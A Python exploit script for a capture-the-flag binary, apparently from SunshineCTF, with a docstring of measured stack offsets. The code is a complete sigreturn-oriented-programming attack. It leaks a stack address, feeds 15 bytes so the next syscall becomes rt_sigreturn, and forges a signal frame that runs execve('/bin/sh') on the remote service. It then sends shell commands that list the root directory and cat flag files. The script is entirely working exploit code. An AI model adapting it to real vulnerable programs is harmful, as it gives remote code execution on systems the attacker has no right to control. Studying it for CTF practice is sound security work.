#!/usr/bin/env python3
"""total_recall - compact SROP, everything inside the first 0x180 bytes.

Measured on the target:
  * buf = L-0x78 and the hijacked `ret` leaves rsp = buf+0x88 (E0/E1 leaks matched
    that arithmetic exactly).
  * 0x401032 -> read(0, buf+0x48, 24); its return value becomes rax, so feeding
    exactly 15 bytes makes the next bare syscall (0x401069) an rt_sigreturn whose
    frame lives at rsp = buf+0x90.
  * the kernel takes rip from frame+0x28+0x80, i.e. the mcontext starts at the
    ucontext, no 128-byte siginfo prefix.
  * a frame whose pointers aimed at buf+0x300 leaked zeros: f2's read(0, buf, 0x400)
    came back short, so the far half of the payload never reached memory.  Hence
    this layout keeps the strings and argv *below* the frame, under one MTU.

    0x60  "/bin/sh"
    0x68  argv = { &"/bin/sh", NULL }
    0x80  0x401032   read 24 into buf+0x48, ret
    0x88  0x401069   bare syscall; ret
    0x90  fake sigframe
    0x178 restored rsp: holds 0x401000, so a failed execve restarts and leaks
          again instead of dying silently - that distinguishes EFAULT/ENOENT
          from a rejected frame.
"""
import re
import socket
import struct
import sys
import time

HOST = "chal.sunshinectf.games"
PORT = 26003
G1, SC, EXIT_RESTART = 0x401032, 0x401069, 0x401000
LEAK_NOSTACK = 0x401017         # mov rsi,rsp ; write(1, rsp, 8)

FRAME_AT = 0x90
OFF_STR, OFF_ARGV, OFF_CHAIN = 0x60, 0x68, 0x80
OFF_BAIT = 0x178                # restored rsp lands here
B = 0x28                        # mcontext base inside the frame
FRAME_LEN = B + 0xC0

SC_RDI, SC_RSI, SC_RDX, SC_RAX, SC_RSP, SC_RIP = 0x40, 0x48, 0x60, 0x68, 0x78, 0x80
SC_EFLAGS, SC_SEL, SC_FPSTATE = 0x88, 0x90, 0xB0


def recvn(s, n, t=4.0):
    s.settimeout(t)
    b = b""
    while len(b) < n:
        try:
            c = s.recv(n - len(b))
        except socket.timeout:
            break
        if not c:
            break
        b += c
    return b


def drain(s, t=2.0):
    s.settimeout(t)
    b = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            b += c
    except socket.timeout:
        pass
    return b


def build_body(buf, rip, rsp, rdi=0, rsi=0, rdx=0, rax=59):
    body = bytearray(b"\x90" * (OFF_BAIT + 8))
    body[OFF_STR:OFF_STR + 8] = b"/bin/sh\x00"
    struct.pack_into("<Q", body, OFF_ARGV, buf + OFF_STR)
    struct.pack_into("<Q", body, OFF_ARGV + 8, 0)
    struct.pack_into("<Q", body, OFF_CHAIN, G1)
    struct.pack_into("<Q", body, OFF_CHAIN + 8, SC)
    struct.pack_into("<Q", body, OFF_BAIT, EXIT_RESTART)
    f = bytearray(FRAME_LEN)
    for off, val in ((SC_RIP, rip), (SC_RSP, rsp), (SC_RDI, rdi), (SC_RSI, rsi),
                     (SC_RDX, rdx), (SC_RAX, rax), (SC_EFLAGS, 0x246),
                     (SC_SEL, 0x33 | (0x2B << 48)), (SC_FPSTATE, 0)):
        struct.pack_into("<Q", f, B + off, val & 0xFFFFFFFFFFFFFFFF)
    body[FRAME_AT:FRAME_AT + FRAME_LEN] = f
    return bytes(body)


def stage1(s, L, body):
    s.sendall(b"\x90" * 24 + body)
    time.sleep(0.5)
    pre = drain(s, 0.3)
    s.sendall(b"Z" * 15)          # rax = 15 = rt_sigreturn
    time.sleep(0.5)
    return pre + drain(s, 0.8)


def probe_rsp_slot():
    """Point the restored rsp at buf+0x88: a hit answers with the constant 0x401069."""
    s = socket.create_connection((HOST, PORT), timeout=20)
    try:
        L = struct.unpack("<Q", recvn(s, 8))[0]
        buf = L - 0x78
        body = build_body(buf, LEAK_NOSTACK, buf + 0x88)
        got = stage1(s, L, body)
        v = struct.unpack("<Q", got[:8])[0] if len(got) >= 8 else None
        print("probe rsp->buf+0x88: n=%d got=%r -> %#x  (want 0x401069)" % (
            len(got), got[:8], v or 0))
        return v == SC
    finally:
        s.close()


def execve_shell(cmds):
    s = socket.create_connection((HOST, PORT), timeout=20)
    try:
        L = struct.unpack("<Q", recvn(s, 8))[0]
        buf = L - 0x78
        body = build_body(buf, SC, buf + OFF_BAIT,
                          rdi=buf + OFF_STR, rsi=buf + OFF_ARGV, rdx=0, rax=59)
        print("[+] buf=%#x str=%#x argv=%#x frame=%#x" % (
            buf, buf + OFF_STR, buf + OFF_ARGV, buf + FRAME_AT))
        got = stage1(s, L, body)
        if len(got) == 8:
            print("[!] got exactly 8 bytes back: the program restarted, so execve "
                  "failed (%r)" % got)
            return None
        print("[*] pre-shell bytes: %r" % got[:40])
        s.sendall("".join(c + "\n" for c in cmds).encode())
        time.sleep(1.0)
        out = drain(s, 5.0)
        sys.stdout.write(out.decode("utf-8", "replace"))
        return out
    finally:
        s.close()


CMDS = ["echo PINGOK", "ls -la /", "cat /flag /flag.txt /home/flag/flag.txt 2>/dev/null"]

if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "probe"
    if mode == "probe":
        probe_rsp_slot()
    else:
        out = execve_shell(CMDS)
        if out:
            for f in re.findall(rb"sun\{[^{}\r\n]{1,120}\}", out):
                print("[FLAG]", f.decode())
                open("flag.txt", "wb").write(f + b"\n")
